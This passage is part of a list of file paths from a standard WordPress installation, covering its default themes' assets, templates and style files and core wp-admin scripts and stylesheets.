    "wp-content/themes/twentytwentyone/archive.php",
    "wp-content/themes/twentytwentyone/page.php",
    "wp-content/themes/twentytwentyone/functions.php",
    "wp-content/themes/twentytwentyone/package-lock.json",
    "wp-content/themes/twentytwentyone/header.php",
    "wp-content/themes/twentytwentyone/single.php",
    "wp-content/themes/twentytwentyone/inc/starter-content.php",
    "wp-content/themes/twentytwentyone/inc/template-tags.php",
    "wp-content/themes/twentytwentyone/inc/custom-css.php",
    "wp-content/themes/twentytwentyone/inc/menu-functions.php",
    "wp-content/themes/twentytwentyone/inc/block-styles.php",
    "wp-content/themes/twentytwentyone/inc/template-functions.php",
    "wp-content/themes/twentytwentyone/inc/back-compat.php",
    "wp-content/themes/twentytwentyone/inc/block-patterns.php",
    "wp-content/themes/twentytwentyone/.stylelintrc.json",
    "wp-content/themes/twentytwentyone/package.json",
    "wp-content/themes/twentytwentyone/.stylelintrc-css.json",
    "wp-content/themes/twentytwentyone/search.php",
    "wp-content/themes/twentytwentyone/classes/class-twenty-twenty-one-svg-icons.php",
    "wp-content/themes/twentytwentyone/classes/class-twenty-twenty-one-dark-mode.php",
    "wp-content/themes/twentytwentyone/classes/class-twenty-twenty-one-customize-color-control.php",
    "wp-content/themes/twentytwentyone/classes/class-twenty-twenty-one-customize-notice-control.php",
    "wp-content/themes/twentytwentyone/classes/class-twenty-twenty-one-customize.php",
    "wp-content/themes/twentytwentyone/classes/class-twenty-twenty-one-custom-colors.php",
    "wp-content/themes/twentytwentyone/.stylelintignore",
    "wp-content/themes/twentytwentyone/searchform.php",
    "wp-content/themes/twentytwentyone/index.php",
    "wp-content/themes/twentytwentyone/image.php",
    "wp-content/themes/twentytwentyone/postcss.config.js",
    "wp-content/themes/twentytwentyfive/readme.txt",
    "wp-content/themes/twentytwentyfive/assets/images/star-thristle-flower.webp",
    "wp-content/themes/twentytwentyfive/assets/images/man-in-hat.webp",
    "wp-content/themes/twentytwentyfive/assets/images/category-anthuriums.webp",
    "wp-content/themes/twentytwentyfive/assets/images/akaka-falls-state-park-flora.webp",
    "wp-content/themes/twentytwentyfive/assets/images/nurse.webp",
    "wp-content/themes/twentytwentyfive/assets/images/botany-flowers.webp",
    "wp-content/themes/twentytwentyfive/assets/images/botany-flowers-closeup.webp",
    "wp-content/themes/twentytwentyfive/assets/images/coming-soon-bg-image.webp",
    "wp-content/themes/twentytwentyfive/assets/images/category-cactus.webp",
    "wp-content/themes/twentytwentyfive/assets/images/book-image-landing.webp",
    "wp-content/themes/twentytwentyfive/assets/images/grid-flower-2.webp",
    "wp-content/themes/twentytwentyfive/assets/images/location.webp",
    "wp-content/themes/twentytwentyfive/assets/images/agenda-img-4.webp",
    "wp-content/themes/twentytwentyfive/assets/images/woman-splashing-water.webp",
    "wp-content/themes/twentytwentyfive/assets/images/vash-gon-square.webp",
    "wp-content/themes/twentytwentyfive/assets/images/services-subscriber-photo.webp",
    "wp-content/themes/twentytwentyfive/assets/images/hero-podcast.webp",
    "wp-content/themes/twentytwentyfive/assets/images/marshland-birds-square.webp",
    "wp-content/themes/twentytwentyfive/assets/images/campanula-alliariifolia-flower.webp",
    "wp-content/themes/twentytwentyfive/assets/images/404-image.webp",
    "wp-content/themes/twentytwentyfive/assets/images/malibu-plantlife.webp",
    "wp-content/themes/twentytwentyfive/assets/images/link-in-bio-image.webp",
    "wp-content/themes/twentytwentyfive/assets/images/red-hibiscus-closeup.webp",
    "wp-content/themes/twentytwentyfive/assets/images/grid-flower-1.webp",
    "wp-content/themes/twentytwentyfive/assets/images/parthenon-square.webp",
    "wp-content/themes/twentytwentyfive/assets/images/poster-image-background.webp",
    "wp-content/themes/twentytwentyfive/assets/images/book-image.webp",
    "wp-content/themes/twentytwentyfive/assets/images/coral-square.webp",
    "wp-content/themes/twentytwentyfive/assets/images/link-in-bio-background.webp",
    "wp-content/themes/twentytwentyfive/assets/images/category-sunflowers.webp",
    "wp-content/themes/twentytwentyfive/assets/images/typewriter.webp",
    "wp-content/themes/twentytwentyfive/assets/images/flower-meadow-square.webp",
    "wp-content/themes/twentytwentyfive/assets/images/ruins-image.webp",
    "wp-content/themes/twentytwentyfive/assets/images/dallas-creek-square.webp",
    "wp-content/themes/twentytwentyfive/assets/images/northern-buttercups-flowers.webp",
    "wp-content/themes/twentytwentyfive/assets/images/delphinium-flowers.webp",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-Black.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-Thin.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-Medium.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-Light.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-LightItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-SemiBoldItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-ThinItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-SemiBold.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-MediumItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-BlackItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-ExtraBold.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-BoldItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-Bold.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-ExtraBoldItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-ExtraLight.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-Regular.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-ExtraLightItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-sans/FiraSans-Italic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/platypi/Platypi-Italic-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/platypi/Platypi-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/vollkorn/Vollkorn-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/vollkorn/Vollkorn-Italic-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/manrope/Manrope-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/roboto-slab/RobotoSlab-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/fira-code/FiraCode-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/ysabeau-office/YsabeauOffice-Italic-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/ysabeau-office/YsabeauOffice-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/beiruti/Beiruti-VariableFont_wght.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-SemiBold.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-MediumItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-ExtraLight.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-Bold.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-ExtraBold.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-ExtraBoldItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-BoldItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-ExtraLightItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-LightItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-Regular.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-Black.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-SemiBoldItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-RegularItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-BlackItalic.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-Light.woff2",
    "wp-content/themes/twentytwentyfive/assets/fonts/literata/Literata72pt-Medium.woff2",
    "wp-content/themes/twentytwentyfive/patterns/cta-newsletter.php",
    "wp-content/themes/twentytwentyfive/patterns/template-home-text-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/comments.php",
    "wp-content/themes/twentytwentyfive/patterns/grid-with-categories.php",
    "wp-content/themes/twentytwentyfive/patterns/event-schedule.php",
    "wp-content/themes/twentytwentyfive/patterns/template-query-loop-photo-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/page-landing-book.php",
    "wp-content/themes/twentytwentyfive/patterns/footer-columns.php",
    "wp-content/themes/twentytwentyfive/patterns/page-shop-home.php",
    "wp-content/themes/twentytwentyfive/patterns/header-columns.php",
    "wp-content/themes/twentytwentyfive/patterns/template-404-vertical-header-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/template-query-loop-text-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/pricing-3-col.php",
    "wp-content/themes/twentytwentyfive/patterns/page-portfolio-home.php",
    "wp-content/themes/twentytwentyfive/patterns/footer.php",
    "wp-content/themes/twentytwentyfive/patterns/banner-intro.php",
    "wp-content/themes/twentytwentyfive/patterns/more-posts.php",
    "wp-content/themes/twentytwentyfive/patterns/pricing-2-col.php",
    "wp-content/themes/twentytwentyfive/patterns/template-query-loop.php",
    "wp-content/themes/twentytwentyfive/patterns/hidden-written-by.php",
    "wp-content/themes/twentytwentyfive/patterns/template-search-vertical-header-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/banner-with-description-and-images-grid.php",
    "wp-content/themes/twentytwentyfive/patterns/logos.php",
    "wp-content/themes/twentytwentyfive/patterns/header-large-title.php",
    "wp-content/themes/twentytwentyfive/patterns/testimonials-6-col.php",
    "wp-content/themes/twentytwentyfive/patterns/contact-location-and-link.php",
    "wp-content/themes/twentytwentyfive/patterns/template-query-loop-news-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/template-archive-news-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/format-audio.php",
    "wp-content/themes/twentytwentyfive/patterns/template-home-news-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/event-3-col.php",
    "wp-content/themes/twentytwentyfive/patterns/banner-poster.php",
    "wp-content/themes/twentytwentyfive/patterns/contact-info-locations.php",
    "wp-content/themes/twentytwentyfive/patterns/page-coming-soon.php",
    "wp-content/themes/twentytwentyfive/patterns/hero-podcast.php",
    "wp-content/themes/twentytwentyfive/patterns/binding-format.php",
    "wp-content/themes/twentytwentyfive/patterns/banner-cover-big-heading.php",
    "wp-content/themes/twentytwentyfive/patterns/template-single-text-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/template-search-news-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/template-search-photo-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/page-link-in-bio-with-tight-margins.php",
    "wp-content/themes/twentytwentyfive/patterns/template-single-photo-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/page-cv-bio.php",
    "wp-content/themes/twentytwentyfive/patterns/template-home-vertical-header-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/template-single-news-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/hero-overlapped-book-cover-with-links.php",
    "wp-content/themes/twentytwentyfive/patterns/post-navigation.php",
    "wp-content/themes/twentytwentyfive/patterns/header.php",
    "wp-content/themes/twentytwentyfive/patterns/page-landing-event.php",
    "wp-content/themes/twentytwentyfive/patterns/testimonials-large.php",
    "wp-content/themes/twentytwentyfive/patterns/vertical-header.php",
    "wp-content/themes/twentytwentyfive/patterns/footer-social.php",
    "wp-content/themes/twentytwentyfive/patterns/footer-centered.php",
    "wp-content/themes/twentytwentyfive/patterns/footer-newsletter.php",
    "wp-content/themes/twentytwentyfive/patterns/template-archive-vertical-header-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/contact-centered-social-link.php",
    "wp-content/themes/twentytwentyfive/patterns/template-query-loop-vertical-header-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/hidden-sidebar.php",
    "wp-content/themes/twentytwentyfive/patterns/testimonials-2-col.php",
    "wp-content/themes/twentytwentyfive/patterns/cta-heading-search.php",
    "wp-content/themes/twentytwentyfive/patterns/template-single-left-aligned-content.php",
    "wp-content/themes/twentytwentyfive/patterns/template-home-posts-grid-news-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/header-centered.php",
    "wp-content/themes/twentytwentyfive/patterns/services-team-photos.php",
    "wp-content/themes/twentytwentyfive/patterns/media-instagram-grid.php",
    "wp-content/themes/twentytwentyfive/patterns/banner-about-book.php",
    "wp-content/themes/twentytwentyfive/patterns/text-faqs.php",
    "wp-content/themes/twentytwentyfive/patterns/page-link-in-bio-wide-margins.php",
    "wp-content/themes/twentytwentyfive/patterns/template-home-photo-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/page-business-home.php",
    "wp-content/themes/twentytwentyfive/patterns/hidden-404.php",
    "wp-content/themes/twentytwentyfive/patterns/template-home-with-sidebar-news-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/template-archive-text-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/hidden-search.php",
    "wp-content/themes/twentytwentyfive/patterns/cta-grid-products-link.php",
    "wp-content/themes/twentytwentyfive/patterns/format-link.php",
    "wp-content/themes/twentytwentyfive/patterns/hero-full-width-image.php",
    "wp-content/themes/twentytwentyfive/patterns/heading-and-paragraph-with-image.php",
    "wp-content/themes/twentytwentyfive/patterns/cta-centered-heading.php",
    "wp-content/themes/twentytwentyfive/patterns/cta-events-list.php",
    "wp-content/themes/twentytwentyfive/patterns/template-single-vertical-header-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/template-page-vertical-header-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/page-landing-podcast.php",
    "wp-content/themes/twentytwentyfive/patterns/cta-book-locations.php",
    "wp-content/themes/twentytwentyfive/patterns/services-subscriber-only-section.php",
    "wp-content/themes/twentytwentyfive/patterns/template-page-photo-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/grid-videos.php",
    "wp-content/themes/twentytwentyfive/patterns/template-single-offset.php",
    "wp-content/themes/twentytwentyfive/patterns/template-archive-photo-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/banner-intro-image.php",
    "wp-content/themes/twentytwentyfive/patterns/page-link-in-bio-heading-paragraph-links-image.php",
    "wp-content/themes/twentytwentyfive/patterns/cta-book-links.php",
    "wp-content/themes/twentytwentyfive/patterns/template-search-text-blog.php",
    "wp-content/themes/twentytwentyfive/patterns/overlapped-images.php",
    "wp-content/themes/twentytwentyfive/patterns/event-rsvp.php",
    "wp-content/themes/twentytwentyfive/patterns/hero-book.php",
    "wp-content/themes/twentytwentyfive/patterns/services-3-col.php",
    "wp-content/themes/twentytwentyfive/patterns/hidden-blog-heading.php",
    "wp-content/themes/twentytwentyfive/parts/footer-columns.html",
    "wp-content/themes/twentytwentyfive/parts/sidebar.html",
    "wp-content/themes/twentytwentyfive/parts/header.html",
    "wp-content/themes/twentytwentyfive/parts/footer.html",
    "wp-content/themes/twentytwentyfive/parts/vertical-header.html",
    "wp-content/themes/twentytwentyfive/parts/header-large-title.html",
    "wp-content/themes/twentytwentyfive/parts/footer-newsletter.html",
    "wp-content/themes/twentytwentyfive/styles/typography/typography-preset-3.json",
    "wp-content/themes/twentytwentyfive/styles/typography/typography-preset-5.json",
    "wp-content/themes/twentytwentyfive/styles/typography/typography-preset-4.json",
    "wp-content/themes/twentytwentyfive/styles/typography/typography-preset-6.json",
    "wp-content/themes/twentytwentyfive/styles/typography/typography-preset-7.json",
    "wp-content/themes/twentytwentyfive/styles/typography/typography-preset-1.json",
    "wp-content/themes/twentytwentyfive/styles/typography/typography-preset-2.json",
    "wp-content/themes/twentytwentyfive/styles/03-dusk.json",
    "wp-content/themes/twentytwentyfive/styles/08-midnight.json",
    "wp-content/themes/twentytwentyfive/styles/blocks/post-terms-1.json",
    "wp-content/themes/twentytwentyfive/styles/blocks/03-annotation.json",
    "wp-content/themes/twentytwentyfive/styles/blocks/01-display.json",
    "wp-content/themes/twentytwentyfive/styles/blocks/02-subtitle.json",
    "wp-content/themes/twentytwentyfive/styles/02-noon.json",
    "wp-content/themes/twentytwentyfive/styles/01-evening.json",
    "wp-content/themes/twentytwentyfive/styles/colors/03-dusk.json",
    "wp-content/themes/twentytwentyfive/styles/colors/08-midnight.json",
    "wp-content/themes/twentytwentyfive/styles/colors/02-noon.json",
    "wp-content/themes/twentytwentyfive/styles/colors/01-evening.json",
    "wp-content/themes/twentytwentyfive/styles/colors/06-morning.json",
    "wp-content/themes/twentytwentyfive/styles/colors/04-afternoon.json",
    "wp-content/themes/twentytwentyfive/styles/colors/07-sunrise.json",
    "wp-content/themes/twentytwentyfive/styles/colors/05-twilight.json",
    "wp-content/themes/twentytwentyfive/styles/06-morning.json",
    "wp-content/themes/twentytwentyfive/styles/04-afternoon.json",
    "wp-content/themes/twentytwentyfive/styles/sections/section-5.json",
    "wp-content/themes/twentytwentyfive/styles/sections/section-2.json",
    "wp-content/themes/twentytwentyfive/styles/sections/section-4.json",
    "wp-content/themes/twentytwentyfive/styles/sections/section-3.json",
    "wp-content/themes/twentytwentyfive/styles/sections/section-1.json",
    "wp-content/themes/twentytwentyfive/styles/07-sunrise.json",
    "wp-content/themes/twentytwentyfive/styles/05-twilight.json",
    "wp-content/themes/twentytwentyfive/functions.php",
    "wp-content/themes/twentytwentyfive/theme.json",
    "wp-content/themes/twentytwentyfive/templates/page.html",
    "wp-content/themes/twentytwentyfive/templates/home.html",
    "wp-content/themes/twentytwentyfive/templates/search.html",
    "wp-content/themes/twentytwentyfive/templates/single.html",
    "wp-content/themes/twentytwentyfive/templates/index.html",
    "wp-content/themes/twentytwentyfive/templates/archive.html",
    "wp-content/themes/twentytwentyfive/templates/404.html",
    "wp-content/themes/twentytwentyfive/templates/page-no-title.html",
    "wp-content/themes/twentysixteen/comments.php",
    "wp-content/themes/twentysixteen/readme.txt",
    "wp-content/themes/twentysixteen/sidebar-content-bottom.php",
    "wp-content/themes/twentysixteen/template-parts/content-single.php",
    "wp-content/themes/twentysixteen/template-parts/content-search.php",
    "wp-content/themes/twentysixteen/template-parts/content.php",
    "wp-content/themes/twentysixteen/template-parts/content-none.php",
    "wp-content/themes/twentysixteen/template-parts/content-page.php",
    "wp-content/themes/twentysixteen/template-parts/biography.php",
    "wp-content/themes/twentysixteen/footer.php",
    "wp-content/themes/twentysixteen/404.php",
    "wp-content/themes/twentysixteen/archive.php",
    "wp-content/themes/twentysixteen/page.php",
    "wp-content/themes/twentysixteen/functions.php",
    "wp-content/themes/twentysixteen/js/skip-link-focus-fix.js",
    "wp-content/themes/twentysixteen/js/functions.js",
    "wp-content/themes/twentysixteen/js/color-scheme-control.js",
    "wp-content/themes/twentysixteen/js/customize-preview.js",
    "wp-content/themes/twentysixteen/js/keyboard-image-navigation.js",
    "wp-content/themes/twentysixteen/js/html5.js",
    "wp-content/themes/twentysixteen/genericons/Genericons.eot",
    "wp-content/themes/twentysixteen/genericons/README.md",
    "wp-content/themes/twentysixteen/genericons/Genericons.woff",
    "wp-content/themes/twentysixteen/genericons/COPYING.txt",
    "wp-content/themes/twentysixteen/genericons/Genericons.ttf",
    "wp-content/themes/twentysixteen/genericons/Genericons.svg",
    "wp-content/themes/twentysixteen/genericons/LICENSE.txt",
    "wp-content/themes/twentysixteen/header.php",
    "wp-content/themes/twentysixteen/single.php",
    "wp-content/themes/twentysixteen/sidebar.php",
    "wp-content/themes/twentysixteen/inc/customizer.php",
    "wp-content/themes/twentysixteen/inc/template-tags.php",
    "wp-content/themes/twentysixteen/inc/back-compat.php",
    "wp-content/themes/twentysixteen/inc/block-patterns.php",
    "wp-content/themes/twentysixteen/fonts/inconsolata/inconsolata-all-400-normal.woff",
    "wp-content/themes/twentysixteen/fonts/inconsolata/inconsolata-latin-ext-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/inconsolata/inconsolata-vietnamese-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/inconsolata/inconsolata-latin-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/inconsolata/LICENSE.txt",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-latin-ext-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-latin-ext-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-cyrillic-ext-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-latin-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-all-700-normal.woff",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-cyrillic-ext-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-vietnamese-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-cyrillic-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-all-400-normal.woff",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-cyrillic-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-latin-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/montserrat-vietnamese-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/montserrat/LICENSE.txt",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-vietnamese-400-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-400-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-all-700-normal.woff",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-vietnamese-900-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-all-400-italic.woff",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-vietnamese-900-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-ext-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-900-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-ext-400-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-700-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-ext-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-ext-900-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-900-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-900-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-all-900-normal.woff",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-ext-700-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-400-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-ext-700-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-900-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-ext-900-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-ext-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-ext-900-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-vietnamese-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-all-700-italic.woff",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-all-900-italic.woff",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-all-400-normal.woff",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-ext-400-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-vietnamese-700-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/LICENSE.txt",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-700-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-cyrillic-ext-400-normal.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-vietnamese-700-italic.woff2",
    "wp-content/themes/twentysixteen/fonts/merriweather/merriweather-latin-ext-900-italic.woff2",
    "wp-content/themes/twentysixteen/search.php",
    "wp-content/themes/twentysixteen/searchform.php",
    "wp-content/themes/twentysixteen/index.php",
    "wp-content/themes/twentysixteen/image.php",
    "wp-content/plugins/hello.php",
    "wp-content/plugins/index.php",
    "wp-content/index.php",
    "wp-config-sample.php",
    "wp-cron.php",
    "wp-admin/install-helper.php",
    "wp-admin/revision.php",
    "wp-admin/themes.php",
    "wp-admin/site-health.php",
    "wp-admin/erase-personal-data.php",
    "wp-admin/privacy-policy-guide.php",
    "wp-admin/install.php",
    "wp-admin/post-new.php",
    "wp-admin/async-upload.php",
    "wp-admin/customize.php",
    "wp-admin/options.php",
    "wp-admin/options-media.php",
    "wp-admin/edit-form-comment.php",
    "wp-admin/tools.php",
    "wp-admin/admin.php",
    "wp-admin/ms-users.php",
    "wp-admin/admin-footer.php",
    "wp-admin/options-privacy.php",
    "wp-admin/freedoms.php",
    "wp-admin/credits.php",
    "wp-admin/about.php",
    "wp-admin/media-upload.php",
    "wp-admin/authorize-application.php",
    "wp-admin/menu.php",
    "wp-admin/plugin-install.php",
    "wp-admin/update.php",
    "wp-admin/press-this.php",
    "wp-admin/admin-post.php",
    "wp-admin/site-editor.php",
    "wp-admin/import.php",
    "wp-admin/ms-admin.php",
    "wp-admin/theme-install.php",
    "wp-admin/ms-edit.php",
    "wp-admin/images/freedom-4.svg",
    "wp-admin/images/freedom-3.svg",
    "wp-admin/images/privacy.svg",
    "wp-admin/images/contribute-main.svg",
    "wp-admin/images/about-release-badge.svg",
    "wp-admin/images/freedom-2.svg",
    "wp-admin/images/dashboard-background.svg",
    "wp-admin/images/freedom-1.svg",
    "wp-admin/images/wordpress-logo.svg",
    "wp-admin/images/wordpress-logo-white.svg",
    "wp-admin/images/contribute-code.svg",
    "wp-admin/images/contribute-no-code.svg",
    "wp-admin/widgets-form.php",
    "wp-admin/options-head.php",
    "wp-admin/nav-menus.php",
    "wp-admin/privacy.php",
    "wp-admin/user-edit.php",
    "wp-admin/css/colors/coffee/colors.scss",
    "wp-admin/css/colors/blue/colors.scss",
    "wp-admin/css/colors/midnight/colors.scss",
    "wp-admin/css/colors/_mixins.scss",
    "wp-admin/css/colors/ectoplasm/colors.scss",
    "wp-admin/css/colors/_variables.scss",
    "wp-admin/css/colors/sunrise/colors.scss",
    "wp-admin/css/colors/light/colors.scss",
    "wp-admin/css/colors/modern/colors.scss",
    "wp-admin/css/colors/_admin.scss",
    "wp-admin/css/colors/ocean/colors.scss",
    "wp-admin/user-new.php",
    "wp-admin/ms-delete-site.php",
    "wp-admin/custom-header.php",
    "wp-admin/ms-upgrade-network.php",
    "wp-admin/js/editor.js",
    "wp-admin/js/custom-background.min.js",
    "wp-admin/js/customize-widgets.js",
    "wp-admin/js/widgets/media-image-widget.min.js",
    "wp-admin/js/widgets/media-audio-widget.min.js",
    "wp-admin/js/widgets/media-widgets.min.js",
    "wp-admin/js/widgets/media-video-widget.min.js",
    "wp-admin/js/widgets/text-widgets.js",
    "wp-admin/js/widgets/text-widgets.min.js",
    "wp-admin/js/widgets/media-widgets.js",
    "wp-admin/js/widgets/media-gallery-widget.min.js",
    "wp-admin/js/widgets/custom-html-widgets.js",
    "wp-admin/js/widgets/custom-html-widgets.min.js",
    "wp-admin/js/widgets/media-video-widget.js",
    "wp-admin/js/widgets/media-image-widget.js",
    "wp-admin/js/widgets/media-gallery-widget.js",
    "wp-admin/js/widgets/media-audio-widget.js",
    "wp-admin/js/dashboard.min.js",
    "wp-admin/js/code-editor.js",
    "wp-admin/js/customize-controls.js",
    "wp-admin/js/edit-comments.min.js",
    "wp-admin/js/custom-background.js",
    "wp-admin/js/svg-painter.js",
    "wp-admin/js/post.js",
    "wp-admin/js/tags-box.js",
    "wp-admin/js/inline-edit-post.js",
    "wp-admin/js/gallery.min.js",
    "wp-admin/js/accordion.js",
    "wp-admin/js/xfn.min.js",
    "wp-admin/js/common.min.js",
    "wp-admin/js/common.js",
    "wp-admin/js/language-chooser.min.js",
    "wp-admin/js/tags.js",
    "wp-admin/js/site-health.min.js",
    "wp-admin/js/link.min.js",
    "wp-admin/js/tags-suggest.js",
    "wp-admin/js/inline-edit-tax.min.js",
    "wp-admin/js/widgets.js",
    "wp-admin/js/word-count.min.js",
    "wp-admin/js/customize-widgets.min.js",
    "wp-admin/js/postbox.min.js",
    "wp-admin/js/privacy-tools.min.js",
    "wp-admin/js/edit-comments.js",
